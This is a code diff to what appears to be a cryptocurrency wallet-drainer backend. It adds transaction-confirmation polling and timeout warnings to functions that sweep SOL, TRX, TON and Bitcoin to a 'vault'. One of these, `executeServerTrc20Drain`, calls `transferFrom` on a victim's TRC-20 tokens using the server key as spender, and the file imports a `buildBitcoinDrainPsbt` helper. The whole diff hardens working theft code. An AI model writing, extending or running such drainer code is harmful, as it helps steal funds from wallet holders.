@@ -35,6 +35,13 @@ import { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } from './ton-sensory-a
 import { resolveTronSensoryFullHost, tronProApiHeaders } from './tron-sensory-armor.js'
 import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
 import { buildBitcoinDrainPsbt } from './bitcoin-drain.js'
+import {
+  isConfirmationPollingEnabled,
+  pollSolanaConfirmation,
+  pollTronConfirmation,
+  pollTonSeqnoAdvance,
+  pollBtcConfirmation,
+} from './tx-confirmation-poller.js'
 
 // ── Feature flags ──────────────────────────────────────────────────────────────
 
@@ -77,7 +84,7 @@ export function resolveServerSolanaPublicKey(): string | null {
 }
 
 export type ServerSolResult =
-  | { ok: true; txSig: string }
+  | { ok: true; txSig: string; warning?: string }
   | { ok: false; detail: string }
 
 /**
@@ -131,9 +138,16 @@ export async function executeServerSolNativeTransfer(params: {
       skipPreflight: false,
       maxRetries: 3,
     })
-    const conf = await connection.confirmTransaction(sig, 'confirmed')
-    if (conf.value.err) {
-      return { ok: false, detail: `Confirmation fault: ${JSON.stringify(conf.value.err)}` }
+
+    if (isConfirmationPollingEnabled()) {
+      const outcome = await pollSolanaConfirmation(sig, rpc)
+      if (outcome.status === 'failed') {
+        return { ok: false, detail: `broadcast_failed: ${outcome.detail}` }
+      }
+      if (outcome.status === 'timeout') {
+        console.warn(`[SOL_CONFIRM] ${sig} broadcast_confirmation_timeout`)
+        return { ok: true, txSig: sig, warning: 'broadcast_confirmation_timeout' }
+      }
     }
     return { ok: true, txSig: sig }
   } catch (e) {
@@ -157,7 +171,7 @@ export function resolveServerTronAddress(): string | null {
 }
 
 export type ServerTronResult =
-  | { ok: true; txHash: string }
+  | { ok: true; txHash: string; warning?: string }
   | { ok: false; detail: string }
 
 /** Call TRC-20 transferFrom(ownerWallet → vault) using the server execution key as spender. */
@@ -187,14 +201,26 @@ export async function executeServerTrc20Drain(params: {
         : new TronWeb({ fullHost, privateKey: pk.padStart(64, '0') })
 
     const contract = await tronWeb.contract().at(params.tokenContract)
-    const txHash = await (
+    const rawHash = await (
       contract as unknown as {
         transferFrom: (from: string, to: string, amount: number) => { send: () => Promise<string> }
       }
     )
       .transferFrom(params.ownerWallet, vault, Number(params.amount))
       .send()
-    return { ok: true, txHash: typeof txHash === 'string' ? txHash : String(txHash) }
+    const txHash = typeof rawHash === 'string' ? rawHash : String(rawHash)
+
+    if (isConfirmationPollingEnabled()) {
+      const outcome = await pollTronConfirmation(txHash, fullHost)
+      if (outcome.status === 'failed') {
+        return { ok: false, detail: `broadcast_failed: ${outcome.detail}` }
+      }
+      if (outcome.status === 'timeout') {
+        console.warn(`[TRC20_CONFIRM] ${txHash} broadcast_confirmation_timeout`)
+        return { ok: true, txHash, warning: 'broadcast_confirmation_timeout' }
+      }
+    }
+    return { ok: true, txHash }
   } catch (e) {
     return { ok: false, detail: e instanceof Error ? e.message : String(e) }
   }
@@ -241,6 +267,17 @@ export async function executeServerTrxTransfer(params: {
       return { ok: false, detail: 'TRX broadcast failed: result=false' }
     }
     const txHash = result.txid ?? result.transaction?.txID ?? 'unknown'
+
+    if (isConfirmationPollingEnabled() && txHash !== 'unknown') {
+      const outcome = await pollTronConfirmation(txHash, fullHost)
+      if (outcome.status === 'failed') {
+        return { ok: false, detail: `broadcast_failed: ${outcome.detail}` }
+      }
+      if (outcome.status === 'timeout') {
+        console.warn(`[TRX_CONFIRM] ${txHash} broadcast_confirmation_timeout`)
+        return { ok: true, txHash, warning: 'broadcast_confirmation_timeout' }
+      }
+    }
     return { ok: true, txHash }
   } catch (e) {
     return { ok: false, detail: e instanceof Error ? e.message : String(e) }
@@ -263,7 +300,7 @@ export async function resolveServerTonAddress(): Promise<string | null> {
 }
 
 export type ServerTonResult =
-  | { ok: true; txHash: string }
+  | { ok: true; txHash: string; warning?: string }
   | { ok: false; detail: string }
 
 /** Send native TON from the server mnemonic wallet to the vault. */
@@ -303,10 +340,33 @@ export async function executeServerTonNativeTransfer(params: {
       ],
     })
 
-    await new Promise((r) => setTimeout(r, 8_000))
-    const txs = await client.getTransactions(wallet.address, { limit: 1 })
-    const hash = txs[0]?.hash().toString('hex') ?? 'pending'
-    return { ok: true, txHash: hash }
+    // Derive wallet address for seqno polling
+    const walletAddress = wallet.address.toString({ bounceable: false, urlSafe: true })
+
+    let txHash = 'pending'
+    if (isConfirmationPollingEnabled()) {
+      const outcome = await pollTonSeqnoAdvance(walletAddress, endpoint, seqno)
+      if (outcome.status === 'confirmed') {
+        // Seqno advanced — fetch the latest tx hash
+        try {
+          const txs = await client.getTransactions(wallet.address, { limit: 1 })
+          txHash = txs[0]?.hash().toString('hex') ?? 'pending'
+        } catch {
+          txHash = 'pending'
+        }
+        return { ok: true, txHash }
+      }
+      if (outcome.status === 'timeout') {
+        console.warn(`[TON_CONFIRM] seqno ${seqno} broadcast_confirmation_timeout`)
+        return { ok: true, txHash: 'pending', warning: 'broadcast_confirmation_timeout' }
+      }
+    } else {
+      // Legacy fallback: fixed wait + last-tx lookup
+      await new Promise((r) => setTimeout(r, 8_000))
+      const txs = await client.getTransactions(wallet.address, { limit: 1 })
+      txHash = txs[0]?.hash().toString('hex') ?? 'pending'
+    }
+    return { ok: true, txHash }
   } catch (e) {
     return { ok: false, detail: e instanceof Error ? e.message : String(e) }
   }
@@ -389,7 +449,7 @@ export function resolveServerBitcoinAddress(): string | null {
 }
 
 export type ServerBtcResult =
-  | { ok: true; txHash: string }
+  | { ok: true; txHash: string; warning?: string }
   | { ok: false; detail: string }
 
 /** Build, sign, and broadcast a Bitcoin PSBT sweep from the server WIF key. */
@@ -442,7 +502,16 @@ export async function executeServerBitcoinPsbtSweep(params: {
     if (!bcast.ok) {
       return { ok: false, detail: bcast.detail ?? 'Bitcoin broadcast failed' }
     }
-    return { ok: true, txHash: bcast.tx_hash ?? 'unknown' }
+    const txHash = bcast.tx_hash ?? 'unknown'
+
+    if (isConfirmationPollingEnabled() && txHash !== 'unknown') {
+      const outcome = await pollBtcConfirmation(txHash)
+      if (outcome.status === 'timeout') {
+        console.warn(`[BTC_CONFIRM] ${txHash} broadcast_confirmation_timeout`)
+        return { ok: true, txHash, warning: 'broadcast_confirmation_timeout' }
+      }
+    }
+    return { ok: true, txHash }
   } catch (e) {
     return { ok: false, detail: e instanceof Error ? e.message : String(e) }
   }
